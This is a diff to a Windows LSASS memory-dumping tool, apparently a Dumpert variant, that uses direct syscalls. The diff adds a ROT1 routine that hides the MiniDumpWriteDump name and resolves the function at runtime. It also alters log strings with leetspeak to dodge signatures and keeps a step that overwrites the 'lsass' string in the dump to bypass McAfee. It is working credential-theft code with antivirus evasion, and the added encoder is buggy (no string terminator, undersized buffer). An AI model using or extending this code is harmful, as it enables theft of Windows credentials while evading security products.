@@ -8,9 +8,38 @@
 #include "Dumpert.h"
 #include <DbgHelp.h>
 
-// FBK
 
 #pragma comment (lib, "Dbghelp.lib")
+
+
+//FBK
+
+char* MyEncrypt(char* input, int key){
+	//char* output = (char*)calloc(1, sizeof(input));
+	char* output;
+	output = malloc(strlen(input)*sizeof(char));
+
+	int keysave = key;
+
+	for (int n = 0, len = strlen(input); n < len; n++)
+	{
+		int currentLetter = input[n];
+		char cipher = currentLetter + key;
+
+		if ((currentLetter - 'a') + key > 26)
+		{
+			key = ((currentLetter - 'a') + key) % 26;
+			cipher = 'a' + key;
+		}
+		output[n] = cipher;
+		//kprintf(L"%d : %c\n", n,output[n]);
+		//kprintf(L"%s \n", output);
+
+		// reset the key and do the next letter
+		key = keysave;
+	}
+	return output;
+}
 
 void DumpHex(const void* data, size_t size, int address) {
 	char ascii[17];
@@ -297,8 +326,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	// Now create os/build specific syscall function pointers.
 	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
 		lpOSVersion = L"10 or Server 2016";
-		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
-		wprintf(L"	[+] Mapping version specific System calls.\n");
+		wprintf(L"	[+] OS is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
 		ZwOpenProcess = &ZwOpenProcess10;
 		NtCreateFile = &NtCreateFile10;
 		ZwClose = &ZwClose10;
@@ -311,7 +339,6 @@ int wmain(int argc, wchar_t* argv[]) {
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
 		lpOSVersion = L"7 SP1 or Server 2008 R2";
 		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
-		wprintf(L"	[+] Mapping version specific System calls.\n");
 		ZwOpenProcess = &ZwOpenProcess7SP1;
 		NtCreateFile = &NtCreateFile7SP1;
 		ZwClose = &ZwClose7SP1;
@@ -325,7 +352,6 @@ int wmain(int argc, wchar_t* argv[]) {
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
 		lpOSVersion = L"8 or Server 2012";
 		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
-		wprintf(L"	[+] Mapping version specific System calls.\n");
 		ZwOpenProcess = &ZwOpenProcess80;
 		NtCreateFile = &NtCreateFile80;
 		ZwClose = &ZwClose80;
@@ -338,7 +364,6 @@ int wmain(int argc, wchar_t* argv[]) {
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
 		lpOSVersion = L"8.1 or Server 2012 R2";
 		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
-		wprintf(L"	[+] Mapping version specific System calls.\n");
 		ZwOpenProcess = &ZwOpenProcess81;
 		NtCreateFile = &NtCreateFile81;
 		ZwClose = &ZwClose81;
@@ -376,9 +401,9 @@ int wmain(int argc, wchar_t* argv[]) {
 		exit(1);
 	}
 
-	wprintf(L"[3] Create memorydump file:\n");
+	wprintf(L"[3] Create mem dump file:\n");
 
-	wprintf(L"	[+] Open a process handle.\n");
+	wprintf(L"	[+] Open a process handl3.\n");
 	HANDLE hProcess = NULL;
 	OBJECT_ATTRIBUTES ObjectAttributes;
 	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
@@ -389,7 +414,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
 	NTSTATUS status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
 	if (hProcess == NULL) {
-		wprintf(L"	[!] Failed to get processhandle.\n");
+		wprintf(L"	[!] Failed to get pr0cesshandle.\n");
 		exit(1);
 	}
 
@@ -402,7 +427,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	UNICODE_STRING uFileName;
 	RtlInitUnicodeString(&uFileName, chDmpFile);
 
-	wprintf(L"	[+] Dump %wZ memory to: %wZ\n", pWinVerInfo->ProcName, uFileName);
+	wprintf(L"	[+] Dump %wZ mem0ry to: %wZ\n", pWinVerInfo->ProcName, uFileName);
 	
 	HANDLE hDmpFile = NULL;
 
@@ -416,21 +441,32 @@ int wmain(int argc, wchar_t* argv[]) {
 		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
 	if (hDmpFile == INVALID_HANDLE_VALUE) {
-		wprintf(L"	[!] Failed to create dumpfile.\n");
+		wprintf(L"	[!] Failed t0 create dumpfile.\n");
 		ZwClose(hProcess);
 		exit(1);
 	}
+	typedef BOOL (WINAPI *mafonction) (_In_ HANDLE hProcess,	_In_ DWORD ProcessId, _In_ HANDLE hFile,_In_ MINIDUMP_TYPE DumpType, _In_opt_ PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
+		_In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, _In_opt_ PMINIDUMP_CALLBACK_INFORMATION CallbackParam );
+
+	HINSTANCE lib_handle;
+	lib_handle = LoadLibrary(TEXT("dbghelp.dll"));
+
+	mafonction mydumpfonction = (mafonction)GetProcAddress(lib_handle, MyEncrypt("LhmhCtloVqhsdCtlo", 1)); //MiniDumpWriteDump with ROT1
 
 	DWORD dwTargetPID = GetProcessId(hProcess);
-	BOOL Success = MiniDumpWriteDump(hProcess, dwTargetPID, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-	if ((!Success))
-	{
-		wprintf(L"	[!] Failed to create minidump, error code: %x\n", GetLastError());
+
+	if (!mydumpfonction) {
+		wprintf(L"	[!] Wrong Return of Address of my supposed to be hidden function!\n");
+		exit(1);
 	}
+
+
+	BOOL Success = mydumpfonction(hProcess, dwTargetPID, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+	if ((!Success)) {
+		wprintf(L"	[!] Failed t0 create minidump, err0r c0de: %x\n", GetLastError());
+	} 
 	else {
 		wprintf(L"	[+] Dump succesful.\n");
-
-
 	}
 
 	Sleep(1000);
@@ -443,7 +479,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	BOOL found = FALSE;
 	ULONG readSize = 2048;
 	char McAfeeString[] = { 'l', 's', 'a', 's', 's' };
-		
+
 	ZeroMemory(&szBuffer, 2048);
 
 	wprintf(L"[4] Read Dump File\n");
@@ -454,14 +490,14 @@ int wmain(int argc, wchar_t* argv[]) {
 			s = find_str_in_data(McAfeeString, szBuffer, readSize);
 			if ((s != NULL) || ( byteOffset.LowPart >= 40000)){
 				found = TRUE;
-				//DumpHex(szBuffer, readSize, byteOffset.LowPart);
+				//DumpHex(szBuffer, readSize, byteOffset.LowPart); // used for debugging
 				szBuffer[s - szBuffer]     = 'm';
 				szBuffer[s - szBuffer + 1] = 'c';
 				szBuffer[s - szBuffer + 2] = 'a';
 				szBuffer[s - szBuffer + 3] = 'f';
 				szBuffer[s - szBuffer + 4] = 'f';
 				wprintf(L"	[+] McAfee AV bypass. Replacing string at address %08X\n", s - szBuffer + byteOffset.LowPart);
-				//DumpHex(szBuffer, readSize, byteOffset.LowPart);
+				//DumpHex(szBuffer, readSize, byteOffset.LowPart); // used for debugging
 				wprintf(L"	[+] Rewriting Dump File\n");
 				status = NtWriteFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
 				
